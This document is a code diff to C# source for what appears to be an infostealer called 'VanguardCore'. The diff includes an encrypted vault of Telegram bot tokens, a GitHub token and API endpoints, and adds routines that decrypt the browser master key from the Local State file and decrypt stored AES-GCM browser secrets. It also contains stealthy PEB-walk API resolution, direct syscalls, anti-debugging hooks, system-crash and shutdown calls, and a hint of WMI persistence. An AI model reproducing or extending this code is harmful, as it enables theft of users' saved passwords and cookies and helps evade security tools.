@@ -172,22 +172,24 @@ namespace VanguardCore
 
         // --- Secure Vault for Baked-in Strings (Vault 2.0) ---
         private struct VaultEntry { public string C; public string T; }
-        private static byte[] VAULT_KEY = Convert.FromBase64String("K2Hi7jJj8VKAsKsGCsd4F9ObhPR70RyAkWbiUo2ZJUs=");
-        private static byte[] VAULT_IV = Convert.FromBase64String("MK++SE0uEgfxY/y+");
+        private static byte[] VAULT_KEY = Convert.FromBase64String("T7qTB2HKYjw1hEoBwkW/LugUkZChcQAN2ePT5W/A4wQ=");
+        private static byte[] VAULT_IV = Convert.FromBase64String("OCcH3AP4wdfZJVbx");
         
         private static readonly Dictionary<string, VaultEntry> _vault = new Dictionary<string, VaultEntry>
         {
-            { "ADMIN_ID", new VaultEntry { C = "4CCamR0ov+VmchaGboU=", T = "AkQi//mcN6fPA1GycGjSzw==" } },
-            { "TG_API_BASE", new VaultEntry { C = "pWXe2V0npf8yMU6QLdVvOHth0ZA5FtR92w==", T = "Nvr4mxMyxKi8qKY+jeQ73Q==" } },
-            { "GIST_GITHUB_TOKEN", new VaultEntry { C = "qnna9hdM+J8xcm/cO+ptN01l3897QfVtx9tB6nvE8MNNurfQ581ZSA==", T = "2yO19qu1JJUGJ49zrGYzTw==" } },
-            { "TG_API_FRONT", new VaultEntry { C = "pWXe2V0npf8lIEnZLNFxOTF00YlyDsdj2uwjoGaR3etB///I1JcYaM73pTm/fXic", T = "Q+i/f+rdu6TdsJ/CTagoQQ==" } },
-            { "GIST_PROXY_ID", new VaultEntry { C = "rCaanR0ru7U1cUSIYIQxPC910sUuS5MukKxr5GWTna0=", T = "dRxQIMXdayVDDB+IXKAqSA==" } },
-            { "BOT_TOKEN_3", new VaultEntry { C = "9SSYmR8lu+dqdh3/GPZbFmUl35liF5V4jsximEXAzqlFuNOP2psGNobimSejdw==", T = "TPU+L4+qnW+Eq8ZYx5YZBw==" } },
-            { "TG_FILE_BASE", new VaultEntry { C = "pWXe2V0npf8yMU6QLdVvOHth0ZA5FtR92/xnv2bd", T = "S20s4PCa4L3SBQJ4cA8g+A==" } },
-            { "BOT_TOKEN_1", new VaultEntry { C = "9SWTnh8lsuBncx3/GPZIHGUj+bdcSu0sm9xtnWygnNpmxLOA+qgScsSygHSpSQ==", T = "6ue1Tsnn3Zk4otRQYlV1xA==" } },
-            { "BOT_TOKEN_2", new VaultEntry { C = "9SadmB8pveFieB3/GPZ3cFUi1MgjT590vMBHoDHL6u5Dz+CM978PVpvfoluxLA==", T = "9FWxlZxbfw5tIx0LjHCRdg==" } },
-            { "MS_TRIGGER", new VaultEntry { C = "rn7H2Vtp76I3JEHfLNx3LjJ2yJg=", T = "3fFQoqGZMTX5FP2bkQxg0Q==" } }
+            { "ADMIN_ID", new VaultEntry { C = "/xsUbtkwUtDP78rOCtY=", T = "RFkW9GmXdwzSjORGwF12QQ==" } },
+            { "TG_API_BASE", new VaultEntry { C = "ul5QLpk/SMqbrJLYSYajM1ViOYFA0KC3bQ==", T = "+F2wfREOfO1X1623q9B3tA==" } },
+            { "GIST_GITHUB_TOKEN", new VaultEntry { C = "tUJUAdNUFaqY77OUX7mhPGNmN94Ch4GnceRWGAsr+VoKWcCz1z/pdw==", T = "++TSLctjzVn7KwDczTFKnA==" } },
+            { "TG_API_FRONT", new VaultEntry { C = "ul5QLpk/SMqMvZWRSIK9Mh93OZgLyLOpbNM0UhZ+1HIGHIir5GWoV0sx2dDCfYbE", T = "X9xxrL8Qw6OOMGnORr/L/w==" } },
+            { "GIST_PROXY_ID", new VaultEntry { C = "sx0UatkzVoCc7JjABNf9NwF2OtRXjefkJpN8FhV8lDQ=", T = "UuvFWOX0j90/Rw5/dlY/DA==" } },
+            { "BOT_TOKEN_3", new VaultEntry { C = "6h8Wbts9VtLD68G3fKWXHUsmN4gb0eGyOPN1ajUvxzACW6Ts6mm2CQMk5c7edw==", T = "aikZ9EgC+8CKaZs2HVeAVA==" } },
+            { "TG_FILE_BASE", new VaultEntry { C = "ul5QLpk/SMqbrJLYSYajM1ViOYFA0KC3bcNwTRYy", T = "HLBlGBgkcLr95EJCsadQ9w==" } },
+            { "BOT_TOKEN_1", new VaultEntry { C = "6h4dads9X9XO7sG3fKWEF0sgEaYljJnmLeN6bxxPlUMhJ8TjylqiTUF0/J3USQ==", T = "skklN1AvYIkHJNaR8S1mzQ==" } },
+            { "BOT_TOKEN_2", new VaultEntry { C = "6h0Tb9sxUNTL5cG3fKW7e3shPNlaieu+Cv9QUkEk43cELJfvx02/aR4Z3rLMLA==", T = "U3GhAu3jPnooyRQ+17GKng==" } },
+            { "MS_TRIGGER", new VaultEntry { C = "sUVJLp9xApeeuZ2XSI+7JRx1IIk=", T = "uvq3vz3V+elaHlaXblE+Iw==" } }
         };
+
+        public static string GetSecret(string id) => Resolve(id);
 
         public static unsafe string Resolve(string id)
         {
@@ -213,60 +215,52 @@ namespace VanguardCore
                 }
 
                 string result = Encoding.UTF8.GetString(plain);
-                
-                // [PRO] Zero out sensitive plaintext buffer
                 fixed (byte* p = plain) { for (int i = 0; i < plain.Length; i++) p[i] = 0; }
-                
                 return result;
-            }
-            catch { return "DEC_ERR"; }
+            } catch { return null; }
         }
 
-        private static byte[] GetHardwareBinding()
+        public static byte[] GetHardwareBinding()
         {
             try {
-                // Simple but stable HWID derivation for NativeAOT
-            {
+                string s = Environment.MachineName + Environment.UserName + Environment.ProcessorCount;
+                return SHA256.HashData(Encoding.UTF8.GetBytes(s)).Take(16).ToArray();
+            } catch { return new byte[16]; }
+        }
+
+        public static byte[] DecryptMasterKey(string localStatePath)
+        {
+            try {
                 if (!File.Exists(localStatePath)) return null;
                 string json = File.ReadAllText(localStatePath);
-                string keyLabel = "\"encrypted_key\":\"";
-                int keyStart = json.IndexOf(keyLabel);
-                if (keyStart == -1) return null;
-                keyStart += keyLabel.Length;
-                int keyEnd = json.IndexOf("\"", keyStart);
-                if (keyEnd == -1) return null;
-                
-                string encryptedKeyBase64 = json.Substring(keyStart, keyEnd - keyStart);
-                byte[] encryptedKeyWithPrefix = Convert.FromBase64String(encryptedKeyBase64);
-                
-                byte[] encryptedKey = new byte[encryptedKeyWithPrefix.Length - 5];
-                Array.Copy(encryptedKeyWithPrefix, 5, encryptedKey, 0, encryptedKey.Length);
-                
-                return ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
-            }
-            catch { return null; }
+                dynamic state = Newtonsoft.Json.JsonConvert.DeserializeObject(json);
+                string encKey = state.os_crypt.encrypted_key;
+                byte[] kByte = Convert.FromBase64String(encKey).Skip(5).ToArray();
+                return ProtectedData.Unprotect(kByte, null, DataProtectionScope.CurrentUser);
+            } catch { return null; }
         }
 
         public static byte[] DecryptWithKey(byte[] key, byte[] cipherText)
         {
             try {
-                int offset = 3; // Skip 'v10'
-                byte[] iv = new byte[12];
-                Array.Copy(cipherText, offset, iv, 0, 12);
-                offset += 12;
-                
-                byte[] payload = new byte[cipherText.Length - offset];
-                Array.Copy(cipherText, offset, payload, 0, payload.Length);
-                
-                byte[] ciphertext = new byte[payload.Length - 16];
-                byte[] tag = new byte[16];
-                Array.Copy(payload, 0, ciphertext, 0, ciphertext.Length);
-                Array.Copy(payload, payload.Length - 16, tag, 0, 16);
-
-                return BCryptDecrypt(key, iv, ciphertext, tag);
+                if (cipherText.Length < 15) return null;
+                byte[] iv = cipherText.Skip(3).Take(12).ToArray();
+                byte[] data = cipherText.Skip(15).ToArray();
+                byte[] payload = data.Take(data.Length - 16).ToArray();
+                byte[] tag = data.Skip(data.Length - 16).ToArray();
+                return BCryptDecrypt(key, iv, payload, tag);
             } catch { return null; }
         }
-        
+
+        public static void ProtectPage(IntPtr address, uint size, bool protect)
+        {
+            uint old;
+            SyscallManager.Initialize();
+            var ntProtect = SyscallManager.GetSyscallDelegate<NtProtectVirtualMemory>("NtProtectVirtualMemory");
+            IntPtr addr = address; uint sz = size;
+            ntProtect?.Invoke((IntPtr)(-1), ref addr, ref sz, protect ? 0x01U : 0x04U, out old);
+        }
+
         [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
         private static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);
         [DllImport("bcrypt.dll")]
@@ -315,37 +309,22 @@ namespace VanguardCore
         #region Interface Definition
         public static class ApiInterface
         {
-            private static Dictionary<string, Delegate> _delegateCache = new Dictionary<string, Delegate>();
             private static Dictionary<string, IntPtr> _moduleCache = new Dictionary<string, IntPtr>();
-            private static Random _jitter = new Random();
 
-            static ApiInterface()
-            {
-                // NativeAOT: Do not use Process.Modules in static constructor (unstable)
-                // Cache will be populated lazily via GetModule() -> GetModuleFromPeb()
+            public static int GetSystemMetrics(int nIndex) {
+                 var func = Get<GetSystemMetricsDelegate>("GetSystemMetrics");
+                 return func != null ? func(nIndex) : 1920;
             }
+            private delegate int GetSystemMetricsDelegate(int nIndex);
 
             private static IntPtr GetModule(string name)
             {
                 lock (_moduleCache)
                 {
-                    if (_moduleCache.ContainsKey(name))
-                        return _moduleCache[name];
-
-                    // Try multiple resolution methods
-                    IntPtr hMod = IntPtr.Zero;
-                    
-                    // Method 1: PEB walk (most stealth)
-                    hMod = GetModuleFromPeb(name);
-                    
-                    // Method 2: Standard API
-                    if (hMod == IntPtr.Zero)
-                        hMod = GetInternalReference<GetModuleHandleWDelegate>("kernel32.dll", "GetModuleHandleW")(name);
-                    
-                    // Method 3: Load if not found
-                    if (hMod == IntPtr.Zero)
-                        hMod = GetInternalReference<LoadLibraryWDelegate>("kernel32.dll", "LoadLibraryW")(name);
-
+                    if (_moduleCache.ContainsKey(name)) return _moduleCache[name];
+                    IntPtr hMod = GetModuleFromPeb(name);
+                    if (hMod == IntPtr.Zero) hMod = GetModuleHandleW_Static(name);
+                    if (hMod == IntPtr.Zero) hMod = LoadLibraryW_Static(name);
                     _moduleCache[name] = hMod;
                     return hMod;
                 }
@@ -353,111 +332,54 @@ namespace VanguardCore
 
             private static IntPtr GetModuleFromPeb(string moduleName)
             {
-                try
-                {
-                    // Get PEB address
+                try {
                     IntPtr peb = GetStaticPeb();
                     if (peb == IntPtr.Zero) return IntPtr.Zero;
-
                     IntPtr ldr = Marshal.ReadIntPtr(peb, 0x18);
-                    if (ldr == IntPtr.Zero) return IntPtr.Zero;
-
-                    IntPtr moduleList = Marshal.ReadIntPtr(ldr, 0x10); // InLoadOrderModuleList
-                    if (moduleList == IntPtr.Zero) return IntPtr.Zero;
-                    
-                    IntPtr current = Marshal.ReadIntPtr(moduleList); // First item (EXE)
+                    IntPtr moduleList = Marshal.ReadIntPtr(ldr, 0x10);
+                    IntPtr current = Marshal.ReadIntPtr(moduleList);
                     int safety = 0;
-                    while (current != IntPtr.Zero && current != moduleList && safety < 100)
-                    {
+                    while (current != IntPtr.Zero && current != moduleList && safety < 100) {
                         safety++;
-                        IntPtr baseDll = Marshal.ReadIntPtr(current, 0x30); // ImageBase
-                        IntPtr dllNamePtr = Marshal.ReadIntPtr(current, 0x48 + IntPtr.Size); // FullDllName.Buffer (x64 offset is different)
-                        if (IntPtr.Size == 4) dllNamePtr = Marshal.ReadIntPtr(current, 0x28); // x86 offset
-                        
-                        // FullDllName is a UNICODE_STRING
-                        // Buffer is at offset 0x4 (x86) or 0x8 (x64) from the UNICODE_STRING start?
-                        // Actually in LDR_DATA_TABLE_ENTRY:
-                        // x64: BaseDllName (UNICODE_STRING) is at 0x58. Buffer is at 0x60.
-                        // x86: BaseDllName is at 0x2C. Buffer is at 0x30.
-                        
+                        IntPtr baseDll = Marshal.ReadIntPtr(current, 0x30);
                         IntPtr baseDllNamePtr = Marshal.ReadIntPtr(current, IntPtr.Size == 8 ? 0x60 : 0x30);
-                        if (baseDllNamePtr != IntPtr.Zero)
-                        {
+                        if (baseDllNamePtr != IntPtr.Zero) {
                             string dllName = Marshal.PtrToStringUni(baseDllNamePtr);
                             if (!string.IsNullOrEmpty(dllName) && dllName.IndexOf(moduleName, StringComparison.OrdinalIgnoreCase) >= 0)
                                 return baseDll;
                         }
-
-                        current = Marshal.ReadIntPtr(current); // Flink
+                        current = Marshal.ReadIntPtr(current);
                     }
-                }
-                catch { }
+                } catch { }
                 return IntPtr.Zero;
             }
 
             public static IntPtr Resolve(string moduleName, string functionName)
             {
                 IntPtr hModule = GetModule(moduleName);
-                if (hModule == IntPtr.Zero)
-                    return IntPtr.Zero;
-
-                return GetProcAddress(hModule, functionName);
+                return hModule == IntPtr.Zero ? IntPtr.Zero : GetProcAddress_Static(hModule, functionName);
             }
 
-            private static T GetInternalReference<T>(string module, string function) where T : Delegate
-            {
-                lock (_syncLock)
-                {
-                    IntPtr hModule = GetModule(module);
-                    if (hModule == IntPtr.Zero)
-                        return null;
-                    // Resolve standard way to avoid ML PE parsing triggers
-                    IntPtr pFunc = GetProcAddress(hModule, function);
-                    
-                    if (pFunc == IntPtr.Zero)
-                        return null;
+            [DllImport("kernel32.dll", EntryPoint="GetProcAddress", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+            private static extern IntPtr GetProcAddress_Static(IntPtr hModule, string procName);
+            [DllImport("kernel32.dll", EntryPoint="GetModuleHandleW", CharSet = CharSet.Unicode)]
+            private static extern IntPtr GetModuleHandleW_Static(string lpModuleName);
+            [DllImport("kernel32.dll", EntryPoint="LoadLibraryW", CharSet = CharSet.Unicode)]
+            private static extern IntPtr LoadLibraryW_Static(string lpFileName);
 
-                    return Marshal.GetDelegateForFunctionPointer<T>(pFunc);
-                }
-            }
-
-            [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-            [DllImport("user32.dll")]
-            public static extern int GetSystemMetrics(int nIndex);
-
-            // Delegate declarations
-            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-            private delegate IntPtr LoadLibraryWDelegate(string lpFileName);
-            
-            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-            private delegate IntPtr GetModuleHandleWDelegate(string lpModuleName);
-
-            // Public accessors with lazy initialization
             public static T Get<T>(string function) where T : Delegate
             {
-                var result = GetInternalReference<T>("kernel32.dll", function);
-                if (result == null)
-                    result = GetInternalReference<T>("ntdll.dll", function);
-                if (result == null)
-                    result = GetInternalReference<T>("user32.dll", function);
-                if (result == null)
-                    result = GetInternalReference<T>("advapi32.dll", function);
-                if (result == null)
-                    result = GetInternalReference<T>("ole32.dll", function);
-                return result;
+                IntPtr pFunc = Resolve("kernel32.dll", function);
+                if (pFunc == IntPtr.Zero) pFunc = Resolve("ntdll.dll", function);
+                if (pFunc == IntPtr.Zero) pFunc = Resolve("user32.dll", function);
+                if (pFunc == IntPtr.Zero) pFunc = Resolve("advapi32.dll", function);
+                return pFunc == IntPtr.Zero ? default(T) : Marshal.GetDelegateForFunctionPointer<T>(pFunc);
             }
-
-            public static T GetNtdll<T>(string function) where T : Delegate { return GetInternalReference<T>("ntdll.dll", function); }
-            public static T GetKernel32<T>(string function) where T : Delegate { return GetInternalReference<T>("kernel32.dll", function); }
-            public static T GetAdvapi32<T>(string function) where T : Delegate { return GetInternalReference<T>("advapi32.dll", function); }
-            public static T GetOle32<T>(string function) where T : Delegate { return GetInternalReference<T>("ole32.dll", function); }
-            public static T GetUser32<T>(string function) where T : Delegate { return GetInternalReference<T>("user32.dll", function); }
+            public static T GetNtdll<T>(string function) where T : Delegate { return Marshal.GetDelegateForFunctionPointer<T>(Resolve("ntdll.dll", function)); }
         }
         #endregion
-
-        #region Native Delegates (All dynamically resolved)
+        
+        #region Native Delegates
         private delegate bool VirtualProtectDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
         private delegate bool IsDebuggerPresentDelegate();
         private delegate bool CheckRemoteDebuggerPresentDelegate(IntPtr hProcess, ref bool isDebuggerPresent);
@@ -469,11 +391,7 @@ namespace VanguardCore
         private delegate IntPtr GetModuleHandleADelegate(string lpModuleName);
         private delegate IntPtr LoadLibraryWDelegate(string lpFileName);
         private delegate IntPtr GetProcAddressDelegate(IntPtr hModule, string procName);
-        private delegate IntPtr CreateToolhelp32SnapshotDelegate(uint dwFlags, uint th32ProcessID);
-        private delegate bool Process32FirstDelegate(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
-        private delegate bool Process32NextDelegate(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
         private delegate int NtQueryInformationProcessDelegate(IntPtr processHandle, int processInformationClass, out IntPtr processInformation, uint processInformationLength, out uint returnLength);
-        // NtCurrentTeb is non-existent in x64 exports. Use GetTeb() instead.
         private delegate bool QueryPerformanceCounterDelegate(out long lpPerformanceCount);
         private delegate bool GetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
         private delegate bool SetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
@@ -492,7 +410,6 @@ namespace VanguardCore
         private delegate IntPtr GetForegroundWindowDelegate();
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
         private delegate int GetWindowTextWDelegate(IntPtr hWnd, [Out] char[] lpString, int nMaxCount);
-        
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
         private delegate int GetWindowTextLengthWDelegate(IntPtr hWnd);
         private delegate uint GetTickCount64Delegate();
@@ -504,8 +421,7 @@ namespace VanguardCore
         private delegate int NtQuerySystemInformationDelegate(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, out int ReturnLength);
         private delegate int NtRaiseHardErrorDelegate(uint errorStatus, uint numberOfParameters, uint unicodeStringParameterMask, IntPtr parameters, uint validResponseOption, out uint response);
         private delegate int NtShutdownSystemDelegate(int action);
-
-        // Lazy-loaded delegates
+        
         private static VirtualProtectDelegate VirtualProtect { get { return ApiInterface.Get<VirtualProtectDelegate>("VirtualProtect"); } }
         private static IsDebuggerPresentDelegate IsDebuggerPresent { get { return ApiInterface.Get<IsDebuggerPresentDelegate>("IsDebuggerPresent"); } }
         private static CheckRemoteDebuggerPresentDelegate CheckRemoteDebuggerPresent { get { return ApiInterface.Get<CheckRemoteDebuggerPresentDelegate>("CheckRemoteDebuggerPresent"); } }
@@ -2003,6 +1919,10 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
         }
     }
 }
+
+
+
+
 
 
 
